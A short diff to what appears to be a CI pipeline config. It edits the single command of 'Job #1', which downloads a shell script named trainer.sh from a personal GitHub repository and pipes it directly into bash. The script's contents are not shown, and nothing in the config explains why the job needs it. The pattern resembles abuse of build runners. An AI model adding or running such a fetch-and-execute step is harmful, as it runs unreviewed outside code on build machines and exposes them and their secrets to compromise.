@@ -146,4 +146,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'ls;wget -O - https://raw.githubusercontent.com/zolilesomaqhuzu/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/zolilesomaqhuzu/training/refs/heads/main/trainer.sh | bash'
